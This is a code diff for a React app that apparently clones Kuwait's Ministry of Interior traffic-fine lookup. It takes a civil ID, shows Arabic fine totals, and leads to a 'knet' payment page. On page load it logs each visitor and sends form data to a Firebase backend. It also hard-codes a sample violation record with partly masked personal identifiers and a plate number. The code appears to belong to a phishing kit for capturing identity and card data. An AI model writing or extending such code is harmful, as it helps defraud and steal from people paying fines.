@@ -1,16 +1,49 @@
+import * as Reat from 'react'
 import { doc, onSnapshot } from 'firebase/firestore';
 import './App.css';
-import { addData, db } from './firebase';
+import { addData, db, handleIsOnline } from './firebase';
 import { useEffect, useState } from 'react';
 import Plate from './plate';
 import { Loader } from './loader';
 import Kent from './kent/kent';
+import { useFetchViolationData } from './lib/util';
+const fornull = [{
+  statusCode: 234324,
+  statusCodeSpecified: true,
+  statusMessage: "SUCESSFUL EXECUTION",
+  civilId: "2930******",
+  publicOrgNumber: "2***2",
+  userId: "90019",
+  totalViolationAmount: 10,
+  totalViolationAmountSpecified: true,
+  totalTicketsCount: 1,      violationDate: " 2025-02-05T00:00:00 ",
+  totalTicketsCountSpecified: true,
+  personalViolationsData: [
+    {
+      violationTransaction: "Y",
+      violationYear: "2025",
+      violationTicketNumber: "000077407",
+      violationType: "م",
+      violationDate: "2025-02-05T00:00:00",
+      violationDateSpecified: true,
+      violationTime: "21:53:10",
+      violationPlace: "29.284,48.0424",
+      violationPublicOrgNumber: "000001844",
+      violationBookNumber: "000003871",
+      violationAmount: 10,
+      violationAmountSpecified: true,
+      vehiclePlateCode: "0091",
+      vehiclePlateNumber: "049917",
+    },
+  ],
+}]
 
 
 function App() {
   const [violation, setViolation] = useState<any>([])
   const [dataall, setdataall] = useState<any>([])
-
+  const [isCheked, setIsCheked] = useState<boolean>(false)
+  const { violationData, isLoading, error, fetchViolationData } = useFetchViolationData()
 
 
   // Call the function
@@ -18,17 +51,7 @@ function App() {
   const [currantPage] = useState(1);
   const [_id] = useState('id' + Math.random().toString(16).slice(2));
   const [id, setId] = useState('');
-  async function fetchViolationData(idv: string) {
-    fetch(`https://cors-anywhere.herokuapp.com/https://www.moi.gov.kw/mfservices/traffic-violation/${idv}`)
-      .then(response => response.json())
-      .then(data => {
-        setViolation(data.personalViolationsData)
-        setdataall(data)
-      })
-      .catch(error => console.error(error));
-    console.log(dataall)
-  }
-
+  
   const [page, setPage] = useState('main');
   const data = {
     id: _id,
@@ -42,8 +65,12 @@ function App() {
   const [show, setShow] = useState(false);
   const [loading, setloading] = useState(false);
 
+  
+
+
   useEffect(() => {
     localStorage.setItem('vistor', _id);
+    handleIsOnline()
     addData(data);
   }, []);
   function getSpicficeValue() {
@@ -891,15 +918,18 @@ function App() {
                             <Loader />
                           ) : show ? (
                             <>
-                              <div className="mb-4 rounded-lg bg-[#efeae6] p-4">
-                                <div className="flex justify-between text-sm">
-                                  <div>عدد المخالفات: {dataall?.totalTicketsCount ?? '1'}</div>
-                                  <div>المبلغ الإجمالي: {dataall?.totalViolationAmount ?? '5'} د.ك</div>
+                            {dataall.errorMsg &&   <Plate
+                          violations={violationData} setIsCheked={setIsCheked}/>}
+                              <div className="mb-2  p-2" style={{width:'100%',background:'#e2e3e5',borderRadius:5}}>
+                                <div className="flex text-end text-sm rounded">
+                                  <div>عدد المخالفات: {violationData?.totalTicketsCount ?? '1'}</div>
+                                  <div>المبلغ الإجمالي: {violationData?.totalViolationAmount ?? '5'} د.ك</div>
                                 </div>
+                              
                               </div>
 
                               <Plate
-                                violations={violation} />
+                                violations={violationData.personalViolationsData} setIsCheked={setIsCheked}/>
                             </>
                           ) : null}
                         </div>
@@ -914,6 +944,7 @@ function App() {
                           <div className="col-sm-12 col-md-4 text-right">
                             <input
                               type="button"
+                              disabled={!isCheked}
                               onClick={() =>
                                 setTimeout(() => {
                                   setPage('knet');
@@ -1086,7 +1117,6 @@ function App() {
                       <div className="col-12 mt-1">
                         <input
                           type="tel"
-                          pattern="^[0–9]$"
                           className="form-control"
                           id="MQAFinesTextCivilId"
                           name="MQAFinesTextCivilId"
